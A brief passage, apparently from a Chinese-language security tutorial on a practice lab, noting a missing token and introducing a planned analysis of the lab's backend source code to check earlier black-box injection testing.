
![image-20230601000528907](D:\Document\My_book\My_Books\钟全龙著\img\image-20230601000528907.png)

没有token值；

## 靶场后端源码分析和函数介绍

通过源码的分析来认识更多的函数，以及检验我们上面黑盒注入的方式有没有问题，有没有误判？有没有没有分析到位的？探索更多的方法攻击，这里将再做分析。

教程持续更新中...



